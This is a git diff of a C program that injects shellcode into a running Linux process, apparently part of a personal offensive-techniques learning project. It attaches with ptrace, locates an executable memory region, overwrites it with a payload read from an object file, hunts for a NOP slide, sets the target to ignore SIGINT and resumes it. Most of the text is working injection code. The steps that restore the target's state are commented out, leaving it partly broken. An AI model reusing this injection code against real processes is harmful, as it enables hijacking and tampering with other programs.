@@ -60,12 +60,22 @@
 #include "Memoroad.h"						// release_a_string()
 #include <sys/mman.h>						// mmap()
 #include "pmparser.h"						// pmStruct_ptr
+#include <signal.h>							// signals
 #include <stdbool.h>						// bool, true, false
 #include <stdio.h>							// fprintf()
 #include <string.h>							// strcmp()
 #include <sys/ptrace.h>						// ptrace()
+#include <sys/syscall.h>					// syscall
 #include <sys/user.h>						// struct user_regs_struct
 #include <sys/wait.h>						// waitpid()
+
+
+// Hijacked!
+void ptrace_read(int pid, unsigned long addr, void *vptr, int len);
+void ptrace_write(int pid, unsigned long addr, void *vptr, int len);
+// Dirty helper function
+void dump_pid_mem(pid_t pid, void* mem_ptr, size_t memLen);
+
 
 int main(int argc, char* argv[])
 {
@@ -91,9 +101,13 @@ int main(int argc, char* argv[])
 	                0x76, 0x65, 0x20, 0x67, 0x6F, 0x74, 0x74, 0x61, 0x20, 0x67, 0x6F, 0x2E, 0x20, 0x50, 0x69, 0x6E, \
 	                0x6B, 0x20, 0x73, 0x6C, 0x69, 0x70, 0x2E, 0x20, 0x2D, 0x43, 0x61, 0x72, 0x64, 0x69, 0x20, 0x42, \
 	                0x0A, 0x00 };
+	char spinCode[5] = { 0x90, 0x90, 0x90, 0xEB, 0xFE };
 	void* codeStart = NULL;  // Pointer to the beginning of the executable shell code
+	size_t codeStartOffset = 0;  // Store the payload's offset of the nopnopnop here
 	char nopCanary[3] = { 0x90, 0x90, 0x90 };  // Look for this nop slide in the shellcode
 	mapMem_ptr mappedPayload = NULL;
+	struct sigaction sigact;  // Used to specify actions for specific signals
+	int sigNum = 1;  // Signal numbers to iterate through
 
 	// INPUT VALIDATION
 	// procPIDStructs
@@ -153,6 +167,28 @@ int main(int argc, char* argv[])
 			{
 				fprintf(stdout, "[*] Located /proc/PID/\n");  // DEBUGGING
 			}
+		}
+	}
+
+	// SIGNAL HANDLER == IGNORE
+	if (success == true)
+	{
+		sigemptyset(&sigact.sa_mask);  // Zeroize the mask of signals which should be blocked
+		sigact.sa_flags = 0;  // Can't think of any good flags to add for what I'm doing
+		sigact.sa_handler = SIG_IGN;  // Apparently, instead of handling the SIGNALS, we'll just ignore them
+
+		// Set the action
+		// rt_sigaction() doesn't work as (barely) documented
+		// Reading sigaction() source code leads me to believe that rt_sigaction wants
+		// 	SIGRTMAX / 8 as the fourth argument (NOT sizeof(sigset_t) like the man page says).
+		// It works.  For more details, read:
+		//	https://github.com/hark130/Latissimus_Dorsi/blob/practice/Research_Documents/3-4-1-rt_sigaction.txt
+		if (-1 == syscall(SYS_rt_sigaction, SIGINT, &sigact, NULL, SIGRTMAX / 8))
+		{
+			errNum = errno;
+			HARKLE_ERROR(nosig, main, syscall failed);
+			HARKLE_ERRNO(nosig, SYS_rt_sigaction, errNum);
+			success = false;
 		}
 	}
 
@@ -234,15 +270,15 @@ int main(int argc, char* argv[])
 			tempRetVal = 0;  // TEST OTHER MEMORY SECTIONS
 			while (tmpPM_ptr)
 			{
-				if (1 == tmpPM_ptr->is_w)
-				// if (1 == tmpPM_ptr->is_x)
+				// if (1 == tmpPM_ptr->is_w)
+				if (1 == tmpPM_ptr->is_x)
 				{
 					if (!tempRetVal)
 					{
 						// pmparser_print(tmpPM_ptr, 0);  // DEBUGGING
 						// fprintf(stdout, "\n");  // DEBUGGING
-						fprintf(stdout, "[*] Found rw-p PID memory\n");  // DEBUGGING
-					    // fprintf(stdout, "[*] Found r-xp PID memory\n");  // DEBUGGING
+						// fprintf(stdout, "[*] Found rw-p PID memory\n");  // DEBUGGING
+					    fprintf(stdout, "[*] Found r-xp PID memory\n");  // DEBUGGING
 						break;  // Found one
 					}
 					else
@@ -309,40 +345,59 @@ int main(int argc, char* argv[])
 			// fprintf(stdout, "Filename is %s\n", payloadFilename);  // DEBUGGING
 			// ↓↓↓ COMMENTED OUT BECAUSE OF A BUG IN os_path_join() ↓↓↓
 			// payloadContents = fread_a_file(payloadFilename, &tempRetVal);
-			// payloadSize = size_a_file("./3-22-1_Payloads/payload_64_write_1.o", &tempRetVal);
+			payloadSize = size_a_file("./3-22-1_Payloads/payload_64_write_1.o", &tempRetVal);
+			// payloadSize = size_a_file("./3-22-1_Payloads/payload_64_write_2.o", &tempRetVal);
 			
-			// if (-1 == payloadSize)
-			// {
-			// 	HARKLE_ERROR(injector, main, size_a_file failed);
-			// 	fprintf(stderr, "size_a_file() returned errno:\t%s\n", strerror(tempRetVal));
-			// 	success = false;
-			// }
-			// else
-			// {
-			// 	// 5.3. Read the payload in
-			// 	// ↓↓↓ COMMENTED OUT BECAUSE OF A BUG IN os_path_join() ↓↓↓
-			// 	// payloadContents = fread_a_file(payloadFilename);
-			// 	payloadContents = fread_a_file("./3-22-1_Payloads/payload_64_write_1.o");
-
-			// 	if (!payloadContents)
-			// 	{
-			// 		HARKLE_ERROR(injector, main, fread_a_file failed);
-			// 		success = false;
-			// 	}
-			// }
-
-			// Map the shell code into memory
-			mappedPayload = map_file("./3-22-1_Payloads/payload_64_write_1.o");
-
-			if (!mappedPayload)
+			if (-1 == payloadSize)
 			{
-				HARKLE_ERROR(injector, main, map_file failed);
+				HARKLE_ERROR(injector, main, size_a_file failed);
+				fprintf(stderr, "size_a_file() returned errno:\t%s\n", strerror(tempRetVal));
 				success = false;
 			}
 			else
 			{
-				fprintf(stdout, "[*] Shellcode mapped into memory\n");  // DEBUGGING
+				// 5.3. Read the payload in
+				// ↓↓↓ COMMENTED OUT BECAUSE OF A BUG IN os_path_join() ↓↓↓
+				// payloadContents = fread_a_file(payloadFilename);
+				payloadContents = fread_a_file("./3-22-1_Payloads/payload_64_write_1.o");
+				// payloadContents = fread_a_file("./3-22-1_Payloads/payload_64_write_2.o");
+
+				if (!payloadContents)
+				{
+					HARKLE_ERROR(injector, main, fread_a_file failed);
+					success = false;
+				}
 			}
+
+			// Map the shell code into memory
+			// mappedPayload = map_file("./3-22-1_Payloads/payload_64_write_1.o");
+
+			// if (!mappedPayload)
+			// {
+			// 	HARKLE_ERROR(injector, main, map_file failed);
+			// 	success = false;
+			// }
+			// else
+			// {
+			// 	fprintf(stdout, "[*] Shellcode mapped into memory\n");  // DEBUGGING
+			// }
+
+			// Map the 'spinning' shell code into memory
+			// mappedPayload = map_file("./3-22-1_Payloads/payload_64_write_2.o");
+
+			// if (!mappedPayload)
+			// {
+			// 	HARKLE_ERROR(injector, main, map_file failed);
+			// 	success = false;
+			// }
+			// else
+			// {
+			// 	fprintf(stdout, "[*] Shellcode mapped into memory\n");  // DEBUGGING
+			// }
+
+			// Get the spin code
+			// payloadContents = spinCode;
+			// payloadSize = sizeof(spinCode);
 		}
 	}
 
@@ -351,106 +406,146 @@ int main(int argc, char* argv[])
 	// payloadSize = sizeof(code);
 
 	// 6. Overwrite executable memory section
-// 	if (true == success)
-// 	{
-// 		// 6.1. Change the permissions on the memory
-// 		// Current working theory... some Linux OSs won't permit mapped memory space
-// 		//	to be rwxp.  If this is true, I'll have to flip permissions on the PID's
-// 		//	memory space depending on what I want to do in that moment.
-// // 		tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
-// // 									  MROAD_PROT_READ | MROAD_PROT_WRITE | MROAD_PROT_EXEC);
-// 		// It's possible that some Linux implementations won't allow mapped memory space
-// 		//	to contain both write *AND* execute permissions at the same time.
-// 		tempRetVal = 0;
-// 		// tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
-// 		// 							  MROAD_PROT_READ | MROAD_PROT_WRITE);
+	if (true == success)
+	{
+		// 6.1. Change the permissions on the memory
+		// Current working theory... some Linux OSs won't permit mapped memory space
+		//	to be rwxp.  If this is true, I'll have to flip permissions on the PID's
+		//	memory space depending on what I want to do in that moment.
+// 		tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
+// 									  MROAD_PROT_READ | MROAD_PROT_WRITE | MROAD_PROT_EXEC);
+		// It's possible that some Linux implementations won't allow mapped memory space
+		//	to contain both write *AND* execute permissions at the same time.
+		tempRetVal = 0;
+		// tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
+		// 							  MROAD_PROT_READ | MROAD_PROT_WRITE);
 
-// 		// getchar();  // DEBUGGING
-// 		if (tempRetVal)
-// 		{
-// 			HARKLE_ERROR(injector, main, change_mmap_prot failed);
-// 			fprintf(stderr, "change_mmap_prot() returned errno:\t%s\n", strerror(tempRetVal));
-// 			success = false;
-// 		}
-// 		else
-// 		{
-// 			// fprintf(stdout, "Writing:\t%s", payloadContents);  // DEBUGGING
-// 			fprintf(stdout, "[*] Modified mapped memory permissions (rw-p)\n");  // DEBUGGING
+		// getchar();  // DEBUGGING
+		if (tempRetVal)
+		{
+			HARKLE_ERROR(injector, main, change_mmap_prot failed);
+			fprintf(stderr, "change_mmap_prot() returned errno:\t%s\n", strerror(tempRetVal));
+			success = false;
+		}
+		else
+		{
+			// fprintf(stdout, "Writing:\t%s", payloadContents);  // DEBUGGING
+			fprintf(stdout, "[*] Modified mapped memory permissions (rw-p)\n");  // DEBUGGING
 
-// 			// fprintf(stdout, "BEFORE\n");  // DEBUGGING
-// 			// for (int i = 0; i < tmpPM_ptr->length; i++)
-// 			// {
-// 			// 	fprintf(stdout, "%02X", (*(((unsigned char*)tmpPM_ptr->addr_start) + i)));
-// 			// }
-// 			// fprintf(stdout, "\n");
+			// fprintf(stdout, "BEFORE\n");  // DEBUGGING
+			// for (int i = 0; i < tmpPM_ptr->length; i++)
+			// {
+			// 	fprintf(stdout, "%02X", (*(((unsigned char*)tmpPM_ptr->addr_start) + i)));
+			// }
+			// fprintf(stdout, "\n");
 
 
-// 			// getchar();  // DEBUGGING
-// 			// getchar();  // DEBUGGING
-// 			// 6.2. Write the payload to memory
-// 			// Attempt #1 - Read in shellcode and write it to the process
-// 			tempRetVal = copy_local_to_remote(vicPID->pidNum, \
-// 											  tmpPM_ptr->addr_start, \
-// 											  payloadContents, \
-// 											  payloadSize);
-// 			// Attempt #2 - Write a buffer of shellcode to the process
-// 			// if (copy_local_to_remote(vicPID->pidNum, \
-// 			// 						 tmpPM_ptr->addr_start, \
-// 			// 						 payloadContents, \
-// 			// 						 sizeof(code)/sizeof(*code)))
-// 			// Attempt #3 - Same as #1 but use ptrace(PTRACE_POKEDATA) instead
-// 			// tempRetVal = htrace_write_data(vicPID->pidNum, \
-// 			// 							   tmpPM_ptr->addr_start, \
-// 			// 							   payloadContents, \
-// 			// 							   payloadSize);
+			// getchar();  // DEBUGGING
+			// getchar();  // DEBUGGING
+			// 6.2. Write the payload to memory
+			// Attempt #1 - Read in shellcode and write it to the process
+			// tempRetVal = copy_local_to_remote(vicPID->pidNum, \
+			// 								  tmpPM_ptr->addr_start, \
+			// 								  payloadContents, \
+			// 								  payloadSize);
 
-// 			if (tempRetVal)
-// 			{
-// 				// HARKLE_ERROR(injector, main, copy_local_to_remote failed);
-// 				// HARKLE_ERRNO(injector, copy_local_to_remote, tempRetVal);
-// 				HARKLE_ERROR(injector, main, htrace_write_data failed);
-// 				HARKLE_ERRNO(injector, htrace_write_data, tempRetVal);
-// 				success = false;
-// 			}
-// 			// else
-// 			// {
-// 			// 	fprintf(stdout, "[*] Overwrote PID memory space\n");  // DEBUGGING
-// 			// }
+			// Attempt #2 - Write a buffer of shellcode to the process
+			// if (copy_local_to_remote(vicPID->pidNum, \
+			// 						 tmpPM_ptr->addr_start, \
+			// 						 payloadContents, \
+			// 						 sizeof(code)/sizeof(*code)))
 
-// 			// if (tempRetVal)
-// 			// {
-// 			// 	HARKLE_ERROR(injector, main, htrace_write_data failed);
-// 			// 	success = false;
-// 			// }
-// 			else
-// 			{
-// 				// fprintf(stdout, "\nAFTER\n");  // DEBUGGING
-// 				// for (int i = 0; i < tmpPM_ptr->length; i++)
-// 				// {
-// 				// 	fprintf(stdout, "%02X", (*(((unsigned char*)tmpPM_ptr->addr_start) + i)));
-// 				// }
-// 				// fprintf(stdout, "\n");
+			// Attempt #3 - Same as #1 but use ptrace(PTRACE_POKEDATA) instead
+			// tempRetVal = htrace_write_data(vicPID->pidNum, \
+			// 							   tmpPM_ptr->addr_start, \
+			// 							   payloadContents, \
+			// 							   payloadSize);
 
-// 				fprintf(stdout, "[*] Overwrote PID memory space\n");  // DEBUGGING
+			// Attempt #4 - Same as #1 but I advance a pointer length into the target space (?!?!?!)
+			// tempRetVal = copy_local_to_remote(vicPID->pidNum, \
+			// 								  tmpPM_ptr->addr_start + sizeof(void*), \
+			// 								  payloadContents, \
+			// 								  payloadSize);
+
+			// Attempt #5 - Same as #3 but I advance a pointer length into the target space (?!?!?!)
+			// tempRetVal = htrace_write_data(vicPID->pidNum, \
+			// 							   tmpPM_ptr->addr_start + sizeof(void*), \
+			// 							   payloadContents, \
+			// 							   payloadSize);
+
+			// Attempt #6 - Use someone else's ptrace(PTRACE_POKEDATA) wrapper (is mine buggy?!?!)
+			// tempRetVal = 0;
+			// fprintf(stdout, "BEFORE:\t%p\n", tmpPM_ptr->addr_start);
+			// dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start, payloadSize);
+			// // dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start, sizeof(void*) * 4);
+			// ptrace_write(vicPID->pidNum, (unsigned long)tmpPM_ptr->addr_start, (void*)payloadContents, (int)payloadSize);
+			// fprintf(stdout, "AFTER\t%p\n", tmpPM_ptr->addr_start);
+			// dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start, payloadSize);
+			// dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start, sizeof(void*) * 4);
+
+			// Attempt #7 - Same as #6 but I advance a pointer length into the target space (?!?!?!)
+			// tempRetVal = 0;
+			// fprintf(stdout, "BEFORE:\t%p\n", tmpPM_ptr->addr_start + sizeof(void*));
+			// dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start + sizeof(void*), sizeof(void*) * 4);
+			// ptrace_write(vicPID->pidNum, (unsigned long)tmpPM_ptr->addr_start + sizeof(void*), (void*)payloadContents, (int)payloadSize);
+			// fprintf(stdout, "AFTER\t%p\n", tmpPM_ptr->addr_start + sizeof(void*));
+			// dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start + sizeof(void*), sizeof(void*) * 4);
+
+			// Attempt #8 - Use someone else's ptrace(PTRACE_POKEDATA) wrapper to write my ACTUAL shellcode
+			tempRetVal = 0;
+			fprintf(stdout, "BEFORE:\t%p\n", tmpPM_ptr->addr_start);
+			dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start, payloadSize);
+			ptrace_write(vicPID->pidNum, (unsigned long)tmpPM_ptr->addr_start, (void*)payloadContents, (int)payloadSize);
+			fprintf(stdout, "AFTER\t%p\n", tmpPM_ptr->addr_start);
+			dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start, payloadSize);
+
+			if (tempRetVal)
+			{
+				// HARKLE_ERROR(injector, main, copy_local_to_remote failed);
+				// HARKLE_ERRNO(injector, copy_local_to_remote, tempRetVal);
+				// HARKLE_ERROR(injector, main, htrace_write_data failed);
+				// HARKLE_ERRNO(injector, htrace_write_data, tempRetVal);
+				success = false;
+			}
+			// else
+			// {
+			// 	fprintf(stdout, "[*] Overwrote PID memory space\n");  // DEBUGGING
+			// }
+
+			// if (tempRetVal)
+			// {
+			// 	HARKLE_ERROR(injector, main, htrace_write_data failed);
+			// 	success = false;
+			// }
+			else
+			{
+				// fprintf(stdout, "\nAFTER\n");  // DEBUGGING
+				// for (int i = 0; i < tmpPM_ptr->length; i++)
+				// {
+				// 	fprintf(stdout, "%02X", (*(((unsigned char*)tmpPM_ptr->addr_start) + i)));
+				// }
+				// fprintf(stdout, "\n");
+
+				fprintf(stdout, "[*] Overwrote PID memory space\n");  // DEBUGGING
 				
-// 				// 6.3. Change the permissions on the memory back to r-xp
-// 				tempRetVal = 0;
-// 				// tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
-// 				// 							  MROAD_PROT_READ | MROAD_PROT_EXEC);
+				// 6.3. Change the permissions on the memory back to r-xp
+				tempRetVal = 0;
+				// tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
+				// 							  MROAD_PROT_READ | MROAD_PROT_EXEC);
 
-// 				if (tempRetVal)
-// 				{
-// 					HARKLE_ERROR(injector, main, change_mmap_prot failed);
-// 					fprintf(stderr, "change_mmap_prot() returned errno:\t%s\n", strerror(tempRetVal));
-// 					success = false;
-// 				}
-// 				else
-// 				{
-// 					fprintf(stdout, "[*] Modified mapped memory permissions (r-xp)\n");  // DEBUGGING
-// 				}
-// 			}
-// 		}
-// 	}
+				// if (tempRetVal)
+				// {
+				// 	HARKLE_ERROR(injector, main, change_mmap_prot failed);
+				// 	fprintf(stderr, "change_mmap_prot() returned errno:\t%s\n", strerror(tempRetVal));
+				// 	success = false;
+				// }
+				// else
+				// {
+				// 	fprintf(stdout, "[*] Modified mapped memory permissions (r-xp)\n");  // DEBUGGING
+				// }
+			}
+		}
+	}
 
 	// DEBUGGING
 // 	void *buf;
@@ -469,27 +564,37 @@ int main(int argc, char* argv[])
 		// codeStart = mem_hunt((void*)payloadContents, (void*)nopCanary, payloadSize, sizeof(nopCanary) / sizeof(*nopCanary));
 		// codeStart = mem_hunt((void*)payloadContents, "909090", payloadSize, strlen("909090"));
 		// codeStart = payloadContents;
-		codeStart = mem_hunt((void*)(mappedPayload->fileMem_ptr), (void*)nopCanary, mappedPayload->memSize, sizeof(nopCanary) / sizeof(*nopCanary));
+		// codeStart = mem_hunt((void*)(mappedPayload->fileMem_ptr), (void*)nopCanary, mappedPayload->memSize, sizeof(nopCanary) / sizeof(*nopCanary));
 		// codeStart = mem_hunt((void*)tmpPM_ptr->addr_start, (void*)nopCanary, tmpPM_ptr->length, sizeof(nopCanary) / sizeof(*nopCanary));
-		
-		// for (int i = 0; i < payloadSize; i++)
-		// {
-		// 	fprintf(stdout, "%02X", (*((unsigned char*)payloadContents + i)));
+		// codeStart = payloadContents;
+		// fprintf(stdout, "LET'S SEARCH THE PAYLOAD CONTENTS FOR THE NOP SLIDE!\n");  // DEBUGGING
+		// mem_hunt((void*)payloadContents, (void*)nopCanary, payloadSize, sizeof(nopCanary) / sizeof(*nopCanary));  // DEBUGGING
 
-		// 	if (i && 0 == ((i + 1) % 16))
-		// 	{
-		// 		fprintf(stdout, "\n");
-		// 	}
-		// 	else if (0 == (i + 1) % 2)
-		// 	{
-		// 		fprintf(stdout, " ");
-		// 	}
-		// }
-		// fprintf(stdout, "\n");
+		codeStartOffset = pid_mem_hunt(vicPID->pidNum, (void*)tmpPM_ptr->addr_start, (void*)nopCanary, tmpPM_ptr->length, sizeof(nopCanary) / sizeof(*nopCanary));
+
+		if (-1 == codeStartOffset)
+		{
+			HARKLE_ERROR(injector, main, pid_mem_hunt failed to find the nop slide);
+			success = false;
+		}
+		else if (-2 == codeStartOffset)
+		{
+			HARKLE_ERROR(injector, main, pid_mem_hunt failed);
+			success = false;
+		}
+		else if (codeStartOffset < 0)
+		{
+			HARKLE_ERROR(injector, main, pid_mem_hunt claimed success but returned a negative offset);
+			success = false;
+		}
+		else
+		{
+			codeStart = tmpPM_ptr->addr_start + codeStartOffset;
+		}
 
 		if (!codeStart)
 		{
-			HARKLE_ERROR(injector, main, mem_hunt failed);
+			HARKLE_ERROR(injector, main, Failed to find the beginning of the shellcode);
 			success = false;
 		}
 		else
@@ -549,74 +654,10 @@ int main(int argc, char* argv[])
 	}	
 
 	// 8. Resume execution
-	// if (true == success)
-	// {
-	// 	ptRetVal = ptrace(PTRACE_CONT, vicPID->pidNum, NULL, NULL);
+	if (true == success)
+	{
+		ptRetVal = ptrace(PTRACE_CONT, vicPID->pidNum, NULL, NULL);
 		
-	// 	if (-1 == ptRetVal)
-	// 	{
-	// 		errNum = errno;
-	// 		HARKLE_ERROR(injector, main, PTRACE_SETREGS failed);
-	// 		fprintf(stderr, "ptrace() returned errno:\t%s\n", strerror(errNum));
-	// 		success = false;
-	// 	}
-	// 	else
-	// 	{
-	// 		fprintf(stdout, "[*] PID's execution resumed\n");  // DEBUGGING
-	// 	}
-	// }
-	// getchar();  // DEBUGGING
-
-	// 9. Wait until the injected code finishes running and hits a SIGTRAP
-	if (true == success)
-	{
-		if (-1 == waitpid(vicPID->pidNum, &errNum, WUNTRACED))
-		{
-			errNum = errno;
-			HARKLE_ERROR(injector, main, waitpid failed);
-			fprintf(stderr, "waitpid() returned errno:\t%s\n", strerror(errNum));
-			success = false;
-		}
-		else
-		{
-			fprintf(stdout, "[*] PID terminated\n");  // DEBUGGING
-			
-			if (WIFSTOPPED(errNum) && WSTOPSIG(errNum) == SIGTRAP)
-			{
-				fprintf(stdout, "[*] PID reached the SIGTRAP\n");  // DEBUGGING
-			}
-			else
-			{
-				HARKLE_ERROR(injector, main, SIGTRAP not found);
-				// success = false;
-			}
-
-		    if (WIFEXITED(errNum)) 
-		    {
-		        printf("Exited normally with status %d\n", WEXITSTATUS(errNum));
-		    }
-		    else if (WIFSIGNALED(errNum)) 
-		    {
-		        printf("Exited due to receiving signal %d\n", WTERMSIG(errNum));
-		    }
-		    else if (WIFSTOPPED(errNum)) 
-		    {
-		        printf("Stopped due to receiving signal %d\n", WSTOPSIG(errNum));
-		    }
-		    else 
-		    {
-		        printf("Something strange just happened.\n");
-		    }
-		}
-	}
-	// getchar();  // DEBUGGING
-
-	// 10. Restore the process back to its original state
-	if (true == success)
-	{
-		// 9.1. Restore the registers
-		ptRetVal = ptrace(PTRACE_SETREGS, vicPID->pidNum, NULL, &oldRegs);
-
 		if (-1 == ptRetVal)
 		{
 			errNum = errno;
@@ -626,58 +667,122 @@ int main(int argc, char* argv[])
 		}
 		else
 		{
-			fprintf(stdout, "[*] Successfully restored registers\n");  // DEBUGGING
+			fprintf(stdout, "[*] PID's execution resumed\n");  // DEBUGGING
 		}
-		// getchar();  // DEBUGGING
+	}
+	getchar();  // DEBUGGING
 
-		// 10.2. Change memory to write permissions
-		tempRetVal = 0;
-		// tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
-		// 							  MROAD_PROT_READ | MROAD_PROT_WRITE);
+	// 9. Wait until the injected code finishes running and hits a SIGTRAP
+	// if (true == success)
+	// {
+	// 	if (-1 == waitpid(vicPID->pidNum, &errNum, WUNTRACED))
+	// 	{
+	// 		errNum = errno;
+	// 		HARKLE_ERROR(injector, main, waitpid failed);
+	// 		fprintf(stderr, "waitpid() returned errno:\t%s\n", strerror(errNum));
+	// 		success = false;
+	// 	}
+	// 	else
+	// 	{
+	// 		fprintf(stdout, "[*] PID terminated\n");  // DEBUGGING
+			
+	// 		if (WIFSTOPPED(errNum) && WSTOPSIG(errNum) == SIGTRAP)
+	// 		{
+	// 			fprintf(stdout, "[*] PID reached the SIGTRAP\n");  // DEBUGGING
+	// 		}
+	// 		else
+	// 		{
+	// 			HARKLE_ERROR(injector, main, SIGTRAP not found);
+	// 			// success = false;
+	// 		}
 
-		// getchar();  // DEBUGGING
-		if (tempRetVal)
+	// 	    if (WIFEXITED(errNum)) 
+	// 	    {
+	// 	        printf("Exited normally with status %d\n", WEXITSTATUS(errNum));
+	// 	    }
+	// 	    else if (WIFSIGNALED(errNum)) 
+	// 	    {
+	// 	        printf("Exited due to receiving signal %d\n", WTERMSIG(errNum));
+	// 	    }
+	// 	    else if (WIFSTOPPED(errNum)) 
+	// 	    {
+	// 	        printf("Stopped due to receiving signal %d\n", WSTOPSIG(errNum));
+	// 	    }
+	// 	    else 
+	// 	    {
+	// 	        printf("Something strange just happened.\n");
+	// 	    }
+	// 	}
+	// }
+	// getchar();  // DEBUGGING
+
+	// 10. Restore the process back to its original state
+	// if (true == success)
+	// {
+	// 	// 9.1. Restore the registers
+	// 	ptRetVal = ptrace(PTRACE_SETREGS, vicPID->pidNum, NULL, &oldRegs);
+
+	// 	if (-1 == ptRetVal)
+	// 	{
+	// 		errNum = errno;
+	// 		HARKLE_ERROR(injector, main, PTRACE_SETREGS failed);
+	// 		fprintf(stderr, "ptrace() returned errno:\t%s\n", strerror(errNum));
+	// 		success = false;
+	// 	}
+	// 	else
+	// 	{
+	// 		fprintf(stdout, "[*] Successfully restored registers\n");  // DEBUGGING
+	// 	}
+	// 	// getchar();  // DEBUGGING
+
+	// 	// 10.2. Change memory to write permissions
+	// 	tempRetVal = 0;
+	// 	// tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
+	// 	// 							  MROAD_PROT_READ | MROAD_PROT_WRITE);
+
+	// 	// getchar();  // DEBUGGING
+	// 	if (tempRetVal)
+	// 	{
+	// 		HARKLE_ERROR(injector, main, change_mmap_prot failed);
+	// 		fprintf(stderr, "change_mmap_prot() returned errno:\t%s\n", strerror(tempRetVal));
+	// 		success = false;
+	// 	}
+	// 	else
 		{
-			HARKLE_ERROR(injector, main, change_mmap_prot failed);
-			fprintf(stderr, "change_mmap_prot() returned errno:\t%s\n", strerror(tempRetVal));
-			success = false;
-		}
-		else
-		{
-			// fprintf(stdout, "Writing:\t%s", payloadContents);  // DEBUGGING
-			fprintf(stdout, "[*] REmodified mapped memory permissions (rw-p)\n");  // DEBUGGING
+	// 		// fprintf(stdout, "Writing:\t%s", payloadContents);  // DEBUGGING
+	// 		fprintf(stdout, "[*] REmodified mapped memory permissions (rw-p)\n");  // DEBUGGING
 		
-			// 10.3. Restore the mapped memory
-			if (copy_local_to_remote(vicPID->pidNum, \
-									 tmpPM_ptr->addr_start, \
-									 localBackup->iov_base, \
-									 localBackup->iov_len))
-			{
-				HARKLE_ERROR(injector, main, copy_local_to_remote failed);
-				success = false;
-			}
-			else
-			{
-				fprintf(stdout, "[*] Restored PID memory space\n");  // DEBUGGING
+	// 		// 10.3. Restore the mapped memory
+	// 		if (copy_local_to_remote(vicPID->pidNum, \
+	// 								 tmpPM_ptr->addr_start, \
+	// 								 localBackup->iov_base, \
+	// 								 localBackup->iov_len))
+	// 		{
+	// 			HARKLE_ERROR(injector, main, copy_local_to_remote failed);
+	// 			success = false;
+	// 		}
+	// 		else
+	// 		{
+	// 			fprintf(stdout, "[*] Restored PID memory space\n");  // DEBUGGING
 
-				// 10.4. Change the permissions on the memory back to r-xp
-				tempRetVal = 0;
-				// tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
-				// 							  MROAD_PROT_READ | MROAD_PROT_EXEC);
+	// 			// 10.4. Change the permissions on the memory back to r-xp
+	// 			tempRetVal = 0;
+	// 			// tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
+	// 			// 							  MROAD_PROT_READ | MROAD_PROT_EXEC);
 
-				if (tempRetVal)
-				{
-					HARKLE_ERROR(injector, main, change_mmap_prot failed);
-					HARKLE_ERRNO(injector, change_mmap_prot, tempRetVal);
-					success = false;
-				}
-				else
-				{
-					fprintf(stdout, "[*] REmodified mapped memory permissions post-restoral (r-xp)\n");  // DEBUGGING
-				}
-			}
-			// getchar();  // DEBUGGING
-		}
+	// 			if (tempRetVal)
+	// 			{
+	// 				HARKLE_ERROR(injector, main, change_mmap_prot failed);
+	// 				HARKLE_ERRNO(injector, change_mmap_prot, tempRetVal);
+	// 				success = false;
+	// 			}
+	// 			else
+	// 			{
+	// 				fprintf(stdout, "[*] REmodified mapped memory permissions post-restoral (r-xp)\n");  // DEBUGGING
+	// 			}
+	// 		}
+	// 		// getchar();  // DEBUGGING
+	// 	}
 		
 		// 10.4. Detack from the process to resume execution
 		ptRetVal = ptrace(PTRACE_DETACH, vicPID->pidNum, NULL, NULL);
@@ -760,4 +865,108 @@ int main(int argc, char* argv[])
 
 	// DONE
 	return 0;
+}
+
+
+/*
+ * ptrace_read()
+ *
+ * Use ptrace() to read the contents of a target process' address space.
+ *
+ * args:
+ * - int pid: pid of the target process
+ * - unsigned long addr: the address to start reading from
+ * - void *vptr: a pointer to a buffer to read data into
+ * - int len: the amount of data to read from the target
+ *
+ */
+void ptrace_read(int pid, unsigned long addr, void *vptr, int len)
+{
+	int bytesRead = 0;
+	int i = 0;
+	long word = 0;
+	long *ptr = (long *) vptr;
+
+	while (bytesRead < len)
+	{
+		word = ptrace(PTRACE_PEEKTEXT, pid, addr + bytesRead, NULL);
+		if(word == -1)
+		{
+			fprintf(stderr, "ptrace(PTRACE_PEEKTEXT) failed\n");
+			exit(1);
+		}
+		bytesRead += sizeof(word);
+		ptr[i++] = word;
+	}
+}
+
+
+/*
+ * ptrace_write()
+ *
+ * Use ptrace() to write to the target process' address space.
+ *
+ * args:
+ * - int pid: pid of the target process
+ * - unsigned long addr: the address to start writing to
+ * - void *vptr: a pointer to a buffer containing the data to be written to the
+ *   target's address space
+ * - int len: the amount of data to write to the target
+ *
+ */
+void ptrace_write(int pid, unsigned long addr, void *vptr, int len)
+{
+	int byteCount = 0;
+	long word = 0;
+
+	while (byteCount < len)
+	{
+		memcpy(&word, vptr + byteCount, sizeof(word));
+		word = ptrace(PTRACE_POKETEXT, pid, addr + byteCount, word);
+		if(word == -1)
+		{
+			fprintf(stderr, "ptrace(PTRACE_POKETEXT) failed\n");
+			exit(1);
+		}
+		byteCount += sizeof(word);
+	}
+}
+
+
+void dump_pid_mem(pid_t pid, void* mem_ptr, size_t memLen)
+{
+	// LOCAL VARIABLES
+	size_t i = 0;  // Iterating variable
+	size_t j = 0;  // Iterating variable
+	long readBytes = 0;  // Store the results of ptrace_read() here
+	unsigned char readByte = 0;  // Store the results of ptrace_read() here
+
+	// INPUT VALIDATION
+	if (pid > 0 && mem_ptr && memLen > 0)
+	{
+		// fprintf(stdout, "printing %zu bytes\n", memLen);  // DEBUGGING
+
